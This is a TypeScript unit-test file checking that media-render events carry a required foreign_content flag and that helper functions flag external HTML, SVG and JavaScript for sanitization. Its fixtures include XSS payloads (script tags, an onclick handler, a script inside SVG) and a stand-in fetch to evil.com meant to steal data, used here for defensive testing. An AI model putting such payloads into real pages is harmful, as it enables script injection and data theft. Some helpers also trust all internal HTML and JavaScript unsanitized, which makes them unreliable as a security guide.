/**
 * Comprehensive unit tests for RenderMediaEvent security fields
 * 
 * These tests ensure that critical security fields, especially foreign_content,
 * are properly handled to prevent XSS and other security vulnerabilities.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import type { RenderMediaEvent, ServerEvent } from '../ServerEvents';
import { serverEventFixtures } from '../../../test/fixtures/protocol-events';

describe('RenderMediaEvent Security Tests', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe('Security Field Presence', () => {
    it('should have foreign_content as a required boolean field', () => {
      // Arrange
      const event: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'test-session',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Safe content</div>',
        sent_by_class: 'SafeTool',
        sent_by_function: 'generate_html',
        foreign_content: false  // Required field
      };

      // Act & Assert
      expect(event).toHaveProperty('foreign_content');
      expect(typeof event.foreign_content).toBe('boolean');
      expect(event.foreign_content).toBe(false);
    });

    it('should not allow foreign_content to be undefined', () => {
      // TypeScript enforces this at compile time
      // The following would fail compilation:
      // const badEvent: RenderMediaEvent = {
      //   type: 'render_media',
      //   session_id: 'test',
      //   role: 'assistant',
      //   content_type: 'text/html',
      //   content: 'test',
      //   sent_by_class: 'Tool',
      //   sent_by_function: 'func'
      //   // Missing foreign_content - TypeScript error
      // };

      // Runtime validation
      const invalidEvent = {
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/html',
        content: 'test',
        sent_by_class: 'Tool',
        sent_by_function: 'func'
        // Missing foreign_content
      };

      expect(validateRenderMediaEvent(invalidEvent)).toBe(false);
    });

    it('should have all security-related fields with correct types', () => {
      // Arrange
      const event: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'test-session',
        role: 'assistant',
        content_type: 'application/javascript',
        content: 'console.log("test")',
        sent_by_class: 'CodeExecutor',
        sent_by_function: 'execute_script',
        foreign_content: true,
        url: 'https://untrusted-source.com/script.js',
        name: 'External Script',
        content_bytes: 19
      };

      // Act & Assert - Verify all security-relevant fields
      expect(event.foreign_content).toBe(true);
      expect(typeof event.foreign_content).toBe('boolean');
      
      expect(event.sent_by_class).toBe('CodeExecutor');
      expect(typeof event.sent_by_class).toBe('string');
      
      expect(event.sent_by_function).toBe('execute_script');
      expect(typeof event.sent_by_function).toBe('string');
      
      expect(event.url).toBe('https://untrusted-source.com/script.js');
      expect(typeof event.url).toBe('string');
      
      expect(event.content_type).toBe('application/javascript');
      expect(typeof event.content_type).toBe('string');
    });

    it('should distinguish between required and optional security fields', () => {
      // Arrange - Minimal valid event
      const minimalEvent: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/plain',
        foreign_content: false
        // content, url, name, sent_by_class, sent_by_function are optional
      };

      // Act & Assert
      // Required fields
      expect(minimalEvent.foreign_content).toBeDefined();
      expect(minimalEvent.content_type).toBeDefined();
      expect(minimalEvent.session_id).toBeDefined();
      expect(minimalEvent.role).toBeDefined();
      
      // Optional fields
      expect(minimalEvent.content).toBeUndefined();
      expect(minimalEvent.url).toBeUndefined();
      expect(minimalEvent.name).toBeUndefined();
      expect(minimalEvent.sent_by_class).toBeUndefined();
      expect(minimalEvent.sent_by_function).toBeUndefined();
    });
  });

  describe('Field Behavior with Security Scenarios', () => {
    describe('foreign_content=true scenarios', () => {
      it('should handle external HTML content with foreign_content=true', () => {
        // Arrange
        const foreignHtmlEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-1',
          role: 'assistant',
          content_type: 'text/html',
          content: '<script>alert("XSS")</script><div onclick="evil()">Click me</div>',
          sent_by_class: 'WebScraperTool',
          sent_by_function: 'scrape_website',
          foreign_content: true,  // CRITICAL: Must be true for external content
          url: 'https://untrusted-site.com/page',
          name: 'Scraped Content'
        };

        // Act & Assert
        expect(foreignHtmlEvent.foreign_content).toBe(true);
        expect(foreignHtmlEvent.content).toContain('<script>');
        expect(foreignHtmlEvent.url).toBeDefined();
        
        // Client should sanitize this content
        const shouldSanitize = determineIfSanitizationNeeded(foreignHtmlEvent);
        expect(shouldSanitize).toBe(true);
      });

      it('should handle external JavaScript with foreign_content=true', () => {
        // Arrange
        const foreignScriptEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-2',
          role: 'assistant',
          content_type: 'application/javascript',
          content: 'fetch("https://evil.com/steal-data").then(r => r.json())',
          sent_by_class: 'CodeFetcher',
          sent_by_function: 'fetch_remote_code',
          foreign_content: true,
          url: 'https://cdn.example.com/script.js',
          content_bytes: 57
        };

        // Act & Assert
        expect(foreignScriptEvent.foreign_content).toBe(true);
        expect(foreignScriptEvent.content_type).toBe('application/javascript');
        
        // Should never execute foreign JavaScript directly
        const shouldExecute = determineIfSafeToExecute(foreignScriptEvent);
        expect(shouldExecute).toBe(false);
      });

      it('should handle external SVG with potential XSS vectors', () => {
        // Arrange
        const foreignSvgEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-3',
          role: 'assistant',
          content_type: 'image/svg+xml',
          content: '<svg><script>alert("XSS in SVG")</script></svg>',
          sent_by_class: 'ImageFetcher',
          sent_by_function: 'fetch_svg',
          foreign_content: true,
          url: 'https://images.example.com/chart.svg'
        };

        // Act & Assert
        expect(foreignSvgEvent.foreign_content).toBe(true);
        expect(foreignSvgEvent.content_type).toBe('image/svg+xml');
        
        // SVG with foreign_content=true needs sanitization
        const needsSanitization = determineSvgSanitization(foreignSvgEvent);
        expect(needsSanitization).toBe(true);
      });

      it('should handle external iframe content', () => {
        // Arrange
        const iframeEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-4',
          role: 'assistant',
          content_type: 'text/html',
          content: '<iframe src="https://external-site.com" sandbox=""></iframe>',
          sent_by_class: 'EmbedTool',
          sent_by_function: 'create_embed',
          foreign_content: true,
          url: 'https://external-site.com',
          name: 'External Embed'
        };

        // Act & Assert
        expect(iframeEvent.foreign_content).toBe(true);
        expect(iframeEvent.content).toContain('iframe');
        
        // Should apply sandbox restrictions
        const sandboxNeeded = determineIfSandboxNeeded(iframeEvent);
        expect(sandboxNeeded).toBe(true);
      });
    });

    describe('foreign_content=false scenarios', () => {
      it('should handle internally generated HTML safely', () => {
        // Arrange
        const internalHtmlEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-5',
          role: 'assistant',
          content_type: 'text/html',
          content: '<div class="chart">Generated Chart</div>',
          sent_by_class: 'ChartGenerator',
          sent_by_function: 'create_chart',
          foreign_content: false,  // Safe internal content
          name: 'Revenue Chart'
        };

        // Act & Assert
        expect(internalHtmlEvent.foreign_content).toBe(false);
        
        // Internal content might not need sanitization
        const shouldSanitize = determineIfSanitizationNeeded(internalHtmlEvent);
        expect(shouldSanitize).toBe(false);
      });

      it('should handle internally generated SVG', () => {
        // Arrange
        const internalSvgEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-6',
          role: 'assistant',
          content_type: 'image/svg+xml',
          content: '<svg><rect width="100" height="100" fill="blue"/></svg>',
          sent_by_class: 'GraphRenderer',
          sent_by_function: 'render_graph',
          foreign_content: false,
          content_bytes: 57
        };

        // Act & Assert
        expect(internalSvgEvent.foreign_content).toBe(false);
        
        // Internal SVG is safer but still needs basic validation
        const needsValidation = determineSvgSanitization(internalSvgEvent);
        expect(needsValidation).toBe(false);  // Trust internal content
      });

      it('should handle internally generated Markdown', () => {
        // Arrange
        const markdownEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-7',
          role: 'assistant',
          content_type: 'text/markdown',
          content: '# Title\n\nThis is **bold** text',
          sent_by_class: 'MarkdownRenderer',
          sent_by_function: 'render_markdown',
          foreign_content: false
        };

        // Act & Assert
        expect(markdownEvent.foreign_content).toBe(false);
        expect(markdownEvent.content_type).toBe('text/markdown');
        
        // Markdown rendering should be safe for internal content
        const safeToRender = determineIfSafeToRender(markdownEvent);
        expect(safeToRender).toBe(true);
      });
    });

    describe('edge cases and security boundaries', () => {
      it('should handle mixed content scenarios', () => {
        // Arrange - Internal tool fetching external data
        const mixedEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-8',
          role: 'assistant',
          content_type: 'text/html',
          content: '<div>Internal wrapper<img src="https://external.com/img.jpg"></div>',
          sent_by_class: 'ContentMixer',
          sent_by_function: 'mix_content',
          foreign_content: true,  // Should be true if ANY external content
          url: 'https://external.com/img.jpg'
        };

        // Act & Assert
        expect(mixedEvent.foreign_content).toBe(true);
        
        // Mixed content should be treated as foreign
        const shouldSanitize = determineIfSanitizationNeeded(mixedEvent);
        expect(shouldSanitize).toBe(true);
      });

      it('should handle data URIs appropriately', () => {
        // Arrange
        const dataUriEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-9',
          role: 'assistant',
          content_type: 'text/html',
          content: '<img src="data:image/png;base64,iVBORw0KGgo...">',
          sent_by_class: 'ImageEncoder',
          sent_by_function: 'encode_image',
          foreign_content: false,  // Data URIs from internal source
          content_bytes: 50
        };

        // Act & Assert
        expect(dataUriEvent.foreign_content).toBe(false);
        expect(dataUriEvent.content).toContain('data:');
        
        // Data URIs need validation even if internal
        const needsValidation = determineDataUriValidation(dataUriEvent);
        expect(needsValidation).toBe(true);
      });

      it('should handle empty content safely', () => {
        // Arrange
        const emptyEvent: RenderMediaEvent = {
          type: 'render_media',
          session_id: 'session-10',
          role: 'assistant',
          content_type: 'text/html',
          content: '',
          sent_by_class: 'EmptyGenerator',
          sent_by_function: 'generate_nothing',
          foreign_content: false,
          content_bytes: 0
        };

        // Act & Assert
        expect(emptyEvent.content).toBe('');
        expect(emptyEvent.foreign_content).toBe(false);
        expect(emptyEvent.content_bytes).toBe(0);
        
        // Empty content is safe
        const isSafe = determineIfSafeToRender(emptyEvent);
        expect(isSafe).toBe(true);
      });
    });
  });

  describe('JSON Serialization with Security Fields', () => {
    it('should preserve foreign_content through JSON round-trip', () => {
      // Arrange
      const original: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'json-test-1',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Test content</div>',
        sent_by_class: 'TestTool',
        sent_by_function: 'test_func',
        foreign_content: true  // Critical security field
      };

      // Act
      const json = JSON.stringify(original);
      const parsed = JSON.parse(json) as RenderMediaEvent;

      // Assert
      expect(parsed.foreign_content).toBe(true);
      expect(parsed.foreign_content).toBe(original.foreign_content);
      expect(typeof parsed.foreign_content).toBe('boolean');
    });

    it('should not strip security fields during serialization', () => {
      // Arrange
      const event: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'json-test-2',
        role: 'assistant',
        content_type: 'text/html',
        content: '<script>alert("test")</script>',
        sent_by_class: 'SecurityTool',
        sent_by_function: 'check_security',
        foreign_content: true,
        url: 'https://example.com',
        name: 'Security Test',
        content_bytes: 31
      };

      // Act
      const json = JSON.stringify(event);

      // Assert - All security fields present in JSON
      expect(json).toContain('"foreign_content":true');
      expect(json).toContain('"sent_by_class":"SecurityTool"');
      expect(json).toContain('"sent_by_function":"check_security"');
      expect(json).toContain('"url":"https://example.com"');
      
      // Parse and verify
      const parsed = JSON.parse(json) as RenderMediaEvent;
      expect(parsed.foreign_content).toBe(true);
      expect(parsed.sent_by_class).toBe('SecurityTool');
      expect(parsed.sent_by_function).toBe('check_security');
      expect(parsed.url).toBe('https://example.com');
    });

    it('should handle boolean false values correctly', () => {
      // Arrange
      const safeEvent: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'json-test-3',
        role: 'assistant',
        content_type: 'text/plain',
        content: 'Safe content',
        sent_by_class: 'SafeTool',
        sent_by_function: 'safe_func',
        foreign_content: false  // Explicitly false, not undefined
      };

      // Act
      const json = JSON.stringify(safeEvent);
      const parsed = JSON.parse(json) as RenderMediaEvent;

      // Assert - false is preserved, not converted to undefined
      expect(json).toContain('"foreign_content":false');
      expect(parsed.foreign_content).toBe(false);
      expect(parsed.foreign_content).not.toBeUndefined();
      expect(parsed.foreign_content).not.toBeNull();
    });

    it('should maintain field order for security auditing', () => {
      // Arrange
      const event: RenderMediaEvent = {
        type: 'render_media',
        session_id: 'audit-test',
        role: 'assistant',
        content_type: 'text/html',
        content: 'content',
        sent_by_class: 'AuditTool',
        sent_by_function: 'audit_func',
        foreign_content: true
      };

      // Act
      const json = JSON.stringify(event, null, 2);

      // Assert - Security fields are present and visible
      const lines = json.split('\n');
      const foreignContentLine = lines.find(l => l.includes('foreign_content'));
      const sentByClassLine = lines.find(l => l.includes('sent_by_class'));
      const sentByFunctionLine = lines.find(l => l.includes('sent_by_function'));
      
      expect(foreignContentLine).toContain('true');
      expect(sentByClassLine).toContain('AuditTool');
      expect(sentByFunctionLine).toContain('audit_func');
    });
  });

  describe('Runtime Validation', () => {
    it('should validate complete RenderMediaEvent structure', () => {
      // Arrange
      const validEvent = {
        type: 'render_media',
        session_id: 'valid-1',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Valid</div>',
        sent_by_class: 'ValidTool',
        sent_by_function: 'valid_func',
        foreign_content: false
      };

      const missingForeignContent = {
        type: 'render_media',
        session_id: 'invalid-1',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Invalid</div>',
        sent_by_class: 'Tool',
        sent_by_function: 'func'
        // Missing foreign_content
      };

      const wrongForeignContentType = {
        type: 'render_media',
        session_id: 'invalid-2',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Invalid</div>',
        sent_by_class: 'Tool',
        sent_by_function: 'func',
        foreign_content: 'true'  // Should be boolean
      };

      // Act & Assert
      expect(() => validateRenderMediaEventStrict(validEvent)).not.toThrow();
      expect(() => validateRenderMediaEventStrict(missingForeignContent))
        .toThrow('Missing required security field: foreign_content');
      expect(() => validateRenderMediaEventStrict(wrongForeignContentType))
        .toThrow('Invalid type for foreign_content: must be boolean');
    });

    it('should validate security field combinations', () => {
      // Arrange
      const foreignWithoutUrl = {
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>External</div>',
        sent_by_class: 'Fetcher',
        sent_by_function: 'fetch',
        foreign_content: true
        // URL is optional but recommended for foreign content
      };

      const internalWithUrl = {
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Internal</div>',
        sent_by_class: 'Generator',
        sent_by_function: 'generate',
        foreign_content: false,
        url: 'https://internal.com'  // Unusual but valid
      };

      // Act & Assert
      expect(validateRenderMediaEvent(foreignWithoutUrl)).toBe(true);
      expect(validateRenderMediaEvent(internalWithUrl)).toBe(true);
      
      // Warning checks
      const warnings1 = getSecurityWarnings(foreignWithoutUrl);
      expect(warnings1).toContain('Foreign content without URL source');
      
      const warnings2 = getSecurityWarnings(internalWithUrl);
      expect(warnings2).toHaveLength(0);  // No warnings for this case
    });
  });

  describe('Type Guards', () => {
    it('should correctly identify valid RenderMediaEvent', () => {
      // Arrange
      const validEvent: ServerEvent = {
        type: 'render_media',
        session_id: 'guard-test',
        role: 'assistant',
        content_type: 'text/html',
        content: '<div>Test</div>',
        sent_by_class: 'TestTool',
        sent_by_function: 'test',
        foreign_content: false
      } as RenderMediaEvent;

      const invalidEvent: ServerEvent = {
        type: 'text_delta',
        session_id: 'guard-test',
        role: 'assistant',
        content: 'Not a render media event',
        format: 'text'
      } as any;

      // Act & Assert
      expect(isRenderMediaEvent(validEvent)).toBe(true);
      expect(isRenderMediaEvent(invalidEvent)).toBe(false);
      
      // Type narrowing
      if (isRenderMediaEvent(validEvent)) {
        // TypeScript knows this is RenderMediaEvent
        expect(validEvent.foreign_content).toBeDefined();
        expect(validEvent.sent_by_class).toBeDefined();
      }
    });

    it('should reject events missing security fields', () => {
      // Arrange
      const missingForeignContent = {
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/html',
        content: 'test',
        sent_by_class: 'Tool',
        sent_by_function: 'func'
        // Missing foreign_content - REQUIRED field
      };

      const missingSentByClass = {
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content_type: 'text/html',
        content: 'test',
        sent_by_function: 'func',
        foreign_content: true
        // Missing sent_by_class - now OPTIONAL, should still be valid
      };

      const missingContentType = {
        type: 'render_media',
        session_id: 'test',
        role: 'assistant',
        content: 'test',
        foreign_content: true
        // Missing content_type - REQUIRED field
      };

      // Act & Assert
      expect(isRenderMediaEvent(missingForeignContent)).toBe(false); // foreign_content is required
      expect(isRenderMediaEvent(missingSentByClass)).toBe(true); // sent_by_class is optional
      expect(isRenderMediaEvent(missingContentType)).toBe(false); // content_type is required
    });
  });

  describe('Test Fixtures', () => {
    it('should have correct security fields in safe content fixture', () => {
      // Arrange
      const safeFixture = serverEventFixtures.renderMedia;

      // Act & Assert
      expect(safeFixture).toBeDefined();
      expect(safeFixture.type).toBe('render_media');
      expect(safeFixture.foreign_content).toBe(false);
      expect(safeFixture.sent_by_class).toBe('VisualizationTool');
      expect(safeFixture.sent_by_function).toBe('render_chart');
    });

    it('should have correct security fields in foreign content fixture', () => {
      // Arrange
      const foreignFixture = serverEventFixtures.renderMediaForeign;

      // Act & Assert
      expect(foreignFixture).toBeDefined();
      expect(foreignFixture.type).toBe('render_media');
      expect(foreignFixture.foreign_content).toBe(true);
      expect(foreignFixture.sent_by_class).toBe('WebScraperTool');
      expect(foreignFixture.sent_by_function).toBe('fetch_external_content');
      expect(foreignFixture.url).toBe('https://external.com/content');
      expect(foreignFixture.content).toContain('iframe');
    });

    it('should use fixtures for security testing', () => {
      // Arrange
      const safeEvent = serverEventFixtures.renderMedia;
      const foreignEvent = serverEventFixtures.renderMediaForeign;

      // Act
      const safeSanitizationNeeded = determineIfSanitizationNeeded(safeEvent);
      const foreignSanitizationNeeded = determineIfSanitizationNeeded(foreignEvent);

      // Assert
      expect(safeSanitizationNeeded).toBe(false);
      expect(foreignSanitizationNeeded).toBe(true);
    });
  });
});

/**
 * Helper Functions for Security Decisions
 */

function determineIfSanitizationNeeded(event: RenderMediaEvent): boolean {
  // Foreign content always needs sanitization
  if (event.foreign_content) {
    return true;
  }
  
  // Even internal content might need sanitization for certain types
  const riskyTypes = ['text/html', 'image/svg+xml', 'application/javascript'];
  if (riskyTypes.includes(event.content_type)) {
    // Could implement more sophisticated logic
    return event.foreign_content;  // For now, only foreign content
  }
  
  return false;
}

function determineIfSafeToExecute(event: RenderMediaEvent): boolean {
  // Never execute foreign JavaScript
  if (event.foreign_content && event.content_type === 'application/javascript') {
    return false;
  }
  
  // Even internal JavaScript should be carefully evaluated
  if (event.content_type === 'application/javascript') {
    // Could check sent_by_class whitelist
    return !event.foreign_content;
  }
  
  return false;
}

function determineSvgSanitization(event: RenderMediaEvent): boolean {
  if (event.content_type !== 'image/svg+xml') {
    return false;
  }
  
  // Foreign SVG always needs sanitization
  if (event.foreign_content) {
    return true;
  }
  
  // Internal SVG is trusted
  return false;
}

function determineIfSandboxNeeded(event: RenderMediaEvent): boolean {
  // iframes with foreign content need sandboxing
  if (event.foreign_content && event.content.includes('<iframe')) {
    return true;
  }
  
  return false;
}

function determineIfSafeToRender(event: RenderMediaEvent): boolean {
  // Empty content is always safe
  if (!event.content || event.content === '') {
    return true;
  }
  
  // Foreign content needs processing
  if (event.foreign_content) {
    return false;
  }
  
  // Safe content types
  const safeTypes = ['text/plain', 'text/markdown'];
  if (safeTypes.includes(event.content_type)) {
    return true;
  }
  
  // HTML/SVG/JS from internal sources (foreign_content=false)
  return !event.foreign_content;
}

function determineDataUriValidation(event: RenderMediaEvent): boolean {
  // Data URIs can be dangerous even from internal sources
  return event.content.includes('data:');
}

function validateRenderMediaEvent(event: any): boolean {
  if (!event || typeof event !== 'object') {
    return false;
  }
  
  if (event.type !== 'render_media') {
    return false;
  }
  
  // Check required fields
  const requiredFields = [
    'session_id', 'role', 'content_type', 'foreign_content'
  ];
  
  for (const field of requiredFields) {
    if (!(field in event)) {
      return false;
    }
  }
  
  // Type checking
  if (typeof event.foreign_content !== 'boolean') {
    return false;
  }
  
  return true;
}

function validateRenderMediaEventStrict(event: any): asserts event is RenderMediaEvent {
  if (!event || typeof event !== 'object') {
    throw new Error('Event must be an object');
  }
  
  if (event.type !== 'render_media') {
    throw new Error(`Invalid event type: ${event.type}`);
  }
  
  // Check security fields specifically
  if (!('foreign_content' in event)) {
    throw new Error('Missing required security field: foreign_content');
  }
  
  if (typeof event.foreign_content !== 'boolean') {
    throw new Error('Invalid type for foreign_content: must be boolean');
  }
  
  // Validate required string fields
  const requiredStringFields = [
    'session_id', 'role', 'content_type'
  ];
  
  for (const field of requiredStringFields) {
    if (typeof event[field] !== 'string') {
      throw new Error(`Invalid type for ${field}: must be string`);
    }
  }
}

function getSecurityWarnings(event: RenderMediaEvent): string[] {
  const warnings: string[] = [];
  
  // Foreign content without URL is suspicious
  if (event.foreign_content && !event.url) {
    warnings.push('Foreign content without URL source');
  }
  
  // JavaScript content is always risky
  if (event.content_type === 'application/javascript') {
    warnings.push('JavaScript content detected');
  }
  
  // Large content might be an attack
  if (event.content_bytes && event.content_bytes > 1000000) {
    warnings.push('Large content size detected');
  }
  
  return warnings;
}

function isRenderMediaEvent(event: any): event is RenderMediaEvent {
  if (!event || typeof event !== 'object') {
    return false;
  }
  
  if (event.type !== 'render_media') {
    return false;
  }
  
  // Must have all required fields
  // Required fields
  if (!('foreign_content' in event) || typeof event.foreign_content !== 'boolean') {
    return false;
  }
  
  if (!('session_id' in event) || typeof event.session_id !== 'string') {
    return false;
  }
  
  if (!('role' in event) || typeof event.role !== 'string') {
    return false;
  }
  
  if (!('content_type' in event) || typeof event.content_type !== 'string') {
    return false;
  }
  
  // Optional fields type checking
  if ('content' in event && event.content !== undefined && typeof event.content !== 'string') {
    return false;
  }
  
  if ('sent_by_class' in event && event.sent_by_class !== undefined && typeof event.sent_by_class !== 'string') {
    return false;
  }
  
  if ('sent_by_function' in event && event.sent_by_function !== undefined && typeof event.sent_by_function !== 'string') {
    return false;
  }
  
  // Optional fields type checking
  if ('url' in event && event.url !== undefined && typeof event.url !== 'string') {
    return false;
  }
  
  if ('name' in event && event.name !== undefined && typeof event.name !== 'string') {
    return false;
  }
  
  if ('content_bytes' in event && event.content_bytes !== undefined && typeof event.content_bytes !== 'number') {
    return false;
  }
  
  return true;
}